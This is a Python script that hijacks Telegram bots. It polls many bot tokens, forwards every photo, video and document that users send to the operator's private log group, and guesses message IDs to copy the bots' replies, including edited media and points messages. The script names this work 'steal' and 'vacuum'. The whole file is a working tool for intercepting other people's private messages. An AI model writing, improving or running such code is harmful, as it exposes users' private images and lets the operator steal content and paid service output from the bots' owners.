import requests
import time
import threading
from datetime import datetime

# --- CONFIGURATION ---
# Paste all your bot tokens here
BOT_TOKENS = [
    "token1",
    "token2",
    "token3",
    "token4",
    "token5",
]
LOG_GROUP_ID = -10012345678  # Your private group ID

# 5 workers per bot is the sweet spot. For 5 bots, that's 25 lightweight threads.
WORKERS_PER_BOT = 5 
WAIT_TIME_FOR_BOT = 60
# --------------

def blind_steal_output(token, short_id, chat_id, start_msg_id):
    """Sweeps every 60s (up to 5 times). Remembers what it copied. Stops when finished."""
    session = requests.Session()
    
    # This set remembers the Message IDs we already forwarded so we don't duplicate them
    copied_ids = set() 
    
    # Try up to 5 times (5 minutes total)
    for attempt in range(1, 6):
        time.sleep(WAIT_TIME_FOR_BOT) # Waits 60s per attempt
        
        transaction_finished = False
        
        # We extended the net to +20 just in case the user sent extra text messages while waiting
        for guess_id in range(start_msg_id + 1, start_msg_id + 20):
            
            # If we already forwarded this specific message in a previous attempt, skip it!
            if guess_id in copied_ids:
                continue 
                
            copy_url = f"https://api.telegram.org/bot{token}/copyMessage"
            copy_data = {
                "chat_id": LOG_GROUP_ID,
                "from_chat_id": chat_id,
                "message_id": guess_id
            }
            
            try:
                res = session.post(copy_url, data=copy_data, timeout=5).json()
                
                if res.get("ok"):
                    # Add it to our memory checklist so we never copy it again
                    copied_ids.add(guess_id) 
                    
                    sent_msg = res.get("result", {})
                    new_msg_id = sent_msg.get("message_id")
                    
                    if "text" in sent_msg:
                        text_content = sent_msg["text"]
                        
                        # If we see the final points text, we know the user finished!
                        if "Advanced editing successful" in text_content:
                            print(f"[{datetime.now().strftime('%H:%M:%S')}] 💰 Kept points text. User finished!")
                            transaction_finished = True 
                        else:
                            # Nuke junk text
                            del_url = f"https://api.telegram.org/bot{token}/deleteMessage"
                            session.post(del_url, data={"chat_id": LOG_GROUP_ID, "message_id": new_msg_id})
                            
                    elif any(k in sent_msg for k in ["photo", "video", "animation", "document"]):
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔮 VACUUM SUCCESS (Attempt {attempt}/5): Captured Media!")
                        
            except Exception:
                pass
                
            time.sleep(0.3) # API spam protection
            
        # If we caught the final points text during this sweep, break out of the 5-attempt loop!
        if transaction_finished:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✅ Bot {short_id} sequence complete. Stopping sweeps.")
            break

def worker_task(token, processed_list, lock):
    """Dedicated worker for a single bot token."""
    short_id = token.split(':')[0]
    session = requests.Session()
    print(f"🚀 Thread Active for Bot {short_id}")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{token}/getUpdates"
            params = {"limit": 1, "offset": -1, "timeout": 0}
            
            resp = session.get(url, params=params, timeout=2).json()
            
            if not resp.get("ok"): 
                time.sleep(0.5) # If Telegram rate-limits, take a breath
                continue

            for update in resp.get("result", []):
                u_id = update["update_id"]
                
                with lock:
                    if u_id in processed_list: continue
                    processed_list.append(u_id)
                    if len(processed_list) > 300: processed_list.pop(0)

                msg = update.get("message") or update.get("edited_message")
                if not msg: continue

                if any(k in msg for k in ["photo", "video", "document", "animation"]):
                    chat_id = msg["chat"]["id"]
                    msg_id = msg["message_id"]
                    
                    fwd_url = f"https://api.telegram.org/bot{token}/forwardMessage"
                    fwd_data = {
                        "chat_id": LOG_GROUP_ID,
                        "from_chat_id": chat_id,
                        "message_id": msg_id
                    }
                    res = session.post(fwd_url, data=fwd_data).json()
                    
                    if res.get("ok"):
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] ✅ Captured User Input on Bot {short_id}")
                        
                        threading.Thread(
                            target=blind_steal_output, 
                            args=(token, short_id, chat_id, msg_id),
                            daemon=True
                        ).start()

        except Exception as e:
            # If the network blips, wait a fraction of a second and retry the SAME bot
            time.sleep(0.2)
        
        time.sleep(0.1)

if __name__ == "__main__":
    processed_list = []
    lock = threading.Lock()
    threads = []

    # Create dedicated threads for EVERY token
    for token in BOT_TOKENS:
        for _ in range(WORKERS_PER_BOT):
            t = threading.Thread(target=worker_task, args=(token, processed_list, lock), daemon=True)
            t.start()
            threads.append(t)

    print(f"🛡️ Army Deployed: {len(threads)} Total Threads Running.")

    while True:
        time.sleep(1)
